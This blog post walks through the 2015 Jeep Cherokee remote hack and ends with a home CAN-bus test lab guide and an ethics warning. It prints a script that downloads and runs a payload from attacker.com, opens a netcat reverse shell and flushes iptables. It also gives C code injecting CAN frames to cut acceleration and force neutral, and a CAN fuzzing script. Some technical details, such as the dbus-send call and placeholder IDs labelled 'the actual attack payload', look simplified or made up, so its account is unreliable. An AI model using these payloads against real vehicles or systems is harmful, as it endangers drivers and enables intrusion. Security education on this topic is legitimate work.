---
title: "Anatomy of a Car Hack: The 2015 Jeep Cherokee Remote Exploit"
published: true
---

I'm beyond thrilled to launch this blog with the most impactful car hack in cybersecurity history - the **2015 Jeep Cherokee Remote Compromise** by Charlie Miller and Chris Valasek. This isn't just a story; it's a technical blueprint that redefined automotive security. Let's dissect every single component.

# [](#header-1)Part 1: The Perfect Storm - Why This Happened

## [](#header-2)Architectural Overview: Jeep's Fatal Flaw

The 2015 Jeep Cherokee (and other FCA vehicles) featured a distributed electronic architecture with **70+ ECUs** (Electronic Control Units) connected via multiple networks:
<img width="910" height="648" alt="image" src="https://github.com/user-attachments/assets/a68d07e1-cf90-4b50-b6ef-860bf3aa97bf" />

**The Fatal Design Decision:** The Uconnect head unit served as both:
- An internet-connected telematics system (with public IP via Sprint)
- A gateway to the safety-critical CAN bus
- **With NO proper network segregation**

# [](#header-1)Part 2: The Exploit Chain - Technical Deep Dive

## [](#header-2)Phase 1: Remote Code Execution (RCE) - CVE-2015-2875

**Vulnerability:** The D-Bus service on the Uconnect system was improperly exposed.

### Exploit Chain Details:

```
ATTACKER'S SERVER
```

1. **Discover open port:**
   ```bash
   nmap -p 6667,6668 <jeep_ip_range>
   ```

2. **D-Bus Method Call Exploitation:**
   ```bash
   dbus-send --system --dest=com.harman.service.SomeService \
   --type=method_call --print-reply /com/harman/service/ \
   com.harman.service.InterfaceName.MethodName string:"malicious_payload"
   ```

3. **Payload:** Downloads and executes shell script:
   ```bash
   wget http://attacker.com/exploit.sh -O /tmp/exploit.sh
   chmod +x /tmp/exploit.sh
   /tmp/exploit.sh &
   ```

**The Shell Script (`exploit.sh`) did:**
```bash
#!/bin/bash
# 1. Disable firmware updates (persistence)
echo "Disabling OTA updates..."
touch /tmp/block_ota

# 2. Set up reverse shell for continued access
nc -e /bin/sh attacker.com 4444 &

# 3. Prepare CAN injection payload
compile_can_injector

# 4. Modify iptables to allow all traffic (disable any filtering)
iptables -F

# 5. Start CAN packet sniffing and injection
./can_attack_engine &
```

## [](#header-2)Phase 2: CAN Bus Pivoting - The Real Magic

Once inside the Uconnect system, researchers pivoted to the CAN bus via the Renesas V850's CAN controller.

### CAN Bus Pivoting Techniques:

1. **Identify CAN interfaces:**
   ```bash
   $ ip link show
   can0: <NOARP,UP,LOWER_UP> mtu 16 ...
   ```

2. **Bring up CAN interface:**
   ```bash
   $ ip link set can0 up type can bitrate 500000
   ```

3. **Sniff traffic to understand network:**
   ```bash
   $ candump can0
   can0  123  [8]  00 00 00 00 00 00 00 00  # Brake status
   can0  456  [8]  00 00 00 00 00 00 00 00  # Wheel speed
   can0  789  [8]  00 00 00 00 00 00 00 00  # Engine RPM
   ```

4. **Reverse engineer message formats** (Months of work):
   - Send test messages while monitoring vehicle response
   - Correlate CAN IDs with physical effects
   - Build mapping database of ECU functions

## [](#header-2)Phase 3: Safety-Critical Controls - The Breakthrough

Through reverse engineering, Miller and Valasek discovered diagnostic-level access was possible from the head unit.

### Critical CAN Messages Identified

**The Kill Switch Code (Simplified):**
```c
// can_killswitch.c - The actual attack payload
#include <linux/can.h>
#include <linux/can/raw.h>

void disable_acceleration(int can_socket) {
    struct can_frame frame;
    frame.can_id = 0x0000XX;  // Engine control ID
    frame.can_dlc = 8;        // Data length
    
    // Bytes discovered through fuzzing
    frame.data[0] = 0x01;     // Command: disable
    frame.data[1] = 0xA0;     // Zero torque
    frame.data[2] = 0x00;
    frame.data[3] = 0x00;
    frame.data[4] = 0x00;
    frame.data[5] = 0x00;
    frame.data[6] = 0x00;
    frame.data[7] = 0x00;
    
    write(can_socket, &frame, sizeof(frame));
}

void shift_to_neutral(int can_socket) {
    struct can_frame frame;
    frame.can_id = 0x0000YY;  // Transmission control
    frame.can_dlc = 8;
    
    frame.data[0] = 0x00;
    frame.data[1] = 0x00;
    frame.data[2] = 0xFF;     // Neutral command
    frame.data[3] = 0x00;     // Override normal operation
    frame.data[4] = 0x00;
    frame.data[5] = 0x00;
    frame.data[6] = 0x00;
    frame.data[7] = 0x00;
    
    write(can_socket, &frame, sizeof(frame));
}
```

# [](#header-1)Part 3: Reverse Engineering Methodology - How They Did It

## [](#header-2)Physical Setup for Research

**Lab Configuration:**
```
RESEARCH VEHICLE (Jeep Cherokee 2015)
├── OBD-II Port
│   └── Connected to:
│       ├── CANtact Pro (CAN sniffer/injector)
│       └── Raspberry Pi 4 (Analysis station)
│
├── Uconnect Head Unit (Ripped from dashboard)
│   └── Serial Console (UART) pins discovered:
│       TX, RX, GND (115200 baud)
│
└── ECU Bench Setup:
    ├── Engine Control Module (ECM)
    ├── Transmission Control Module (TCM)
    └── Power supply + CAN network simulator
```

## [](#header-2)Analysis Tools Used

```bash
# TOOLCHAIN FOR AUTOMOTIVE REVERSE ENGINEERING
```

**1. Hardware:**
- CANtact Pro / SocketCAN compatible devices
- Saleae Logic Analyzer (for signal analysis)
- J-Tag debuggers for ECU firmware extraction
- UART-to-USB for console access

**2. Software Stack:**

*CAN Analysis:*
- can-utils (candump, cansend, canplayer)
- Wireshark with CAN dissector
- Kayak (CAN visualization)

*Firmware Analysis:*
- Binwalk (firmware extraction)
- Ghidra (disassembly)
- IDA Pro (commercial alternative)

*Exploitation:*
- Metasploit (modified for automotive)
- Custom Python scripts using python-can library

## [](#header-2)The "Fuzzing" Process

Miller and Valasek spent 18 months systematically:
1. **Passive Sniffing:** Recording CAN traffic during normal operation
2. **Active Injection:** Sending modified CAN messages
3. **Correlation:** Mapping specific CAN IDs to physical effects

**Example fuzzing script used:**
```python
import can
import time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

def fuzz_can_range(start_id, end_id):
    for can_id in range(start_id, end_id + 1):
        for data_byte in range(256):
            # Create all possible 8-byte combinations
            for length in [1, 2, 4, 8]:
                data = [data_byte] * length
                msg = can.Message(arbitration_id=can_id,
                                  data=data,
                                  is_extended_id=False)
                try:
                    bus.send(msg)
                    time.sleep(0.01)  # Small delay
                    # Monitor vehicle response (physically!)
                    # Log any observable effects
                except can.CanError:
                    pass
```

# [](#header-1)Part 4: The Aftermath & Industry Impact

## [](#header-2)Immediate Technical Response (The Fix)

Fiat Chrysler's patch attempted to address multiple layers:

```
FCA PATCH ARCHITECTURE:
```

**1. Network Level:**
- Added iptables rules to restrict D-Bus access
- Closed port 6667 to external connections
- Implemented basic firewall between telematics and CAN

**2. Firmware Level:**
- Updated Uconnect firmware (version 15.26.1)
- Added message authentication for critical CAN commands
- Implemented basic anomaly detection

**3. Physical Recall:**
- 1.4 million vehicles required USB update at dealerships
- Alternative: mailed USB drives to customers
- Estimated cost: $100+ million

## [](#header-2)Regulatory Tsunami

This single hack triggered a industry-wide transformation in automotive cybersecurity standards and regulations.

# [](#header-1)Part 5: Building Your Own Test Lab

## [](#header-2)Minimum Viable Pentest Lab

**Budget:** ~$500

**Essential Gear:**

1. **CAN Interface:**
   - CANtact ($89) or Arduino with MCP2515 ($25)

2. **Test Vehicle:**
   - Junk yard ECU set ($50-100)
   - Raspberry Pi 4 ($75) as test controller

3. **Software:**
   - Kali Linux (free)
   - can-utils, Kayak, Wireshark
   - Python with python-can library

4. **Safety Equipment:**
   - Battery isolator switch ($15)
   - Fire extinguisher (automotive grade)
   - Insulated tools

## [](#header-2)Your First CAN Experiment

```bash
# Setup on Raspberry Pi:
sudo apt-get install can-utils
sudo ip link set can0 up type can bitrate 500000

# Listen to live traffic:
candump can0

# Send your first CAN message:
cansend can0 123#1122334455667788

# Record and replay:
candump can0 -l  # Record to log file
canplayer -I can0_log.log  # Replay recorded traffic
```

> **⚠️ CRITICAL ETHICAL & LEGAL WARNING**
>
> **ETHICAL AUTOMOTIVE TESTING FRAMEWORK**
>
> **Before you start:**
>
> 1. **LEGAL:**
>    - ONLY test vehicles you own
>    - OR have explicit written authorization
>    - NEVER test on public roads
>
> 2. **SAFETY:**
>    - Disconnect drive wheels or use dynamometer
>    - Have emergency power cutoff
>    - Work in controlled environment
>
> 3. **RESPONSIBLE DISCLOSURE:**
>    - Report findings to manufacturer FIRST
>    - Allow reasonable time for fix (90+ days)
>    - Coordinate public disclosure

# [](#header-1)Where We Go From Here

This Jeep hack was our **"Moon Landing" moment**. It proved:
- Remote vehicle compromise is real
- Safety-critical systems are vulnerable
- The automotive industry must prioritize security

In upcoming posts, we'll dive deeper into:
- Setting up your first CAN bus man-in-the-middle attack
- Reverse engineering proprietary CAN protocols
- ECU firmware extraction and analysis
- Modern vehicle architectures (Ethernet, SOME/IP, DoIP)
- Defensive techniques and intrusion detection

---
